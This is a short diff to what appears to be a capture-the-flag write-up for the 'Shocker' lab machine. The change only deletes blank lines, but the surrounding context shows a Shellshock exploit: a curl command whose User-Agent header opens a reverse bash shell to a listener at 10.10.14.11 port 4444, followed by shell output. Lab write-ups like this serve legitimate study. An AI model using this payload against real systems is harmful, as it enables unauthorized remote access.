@@ -41,8 +41,6 @@ from there all we need is a shell
 curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh
 ```
 
-
-
 ```bash
 shelly@Shocker:/home$ cd shelly
 cd shelly
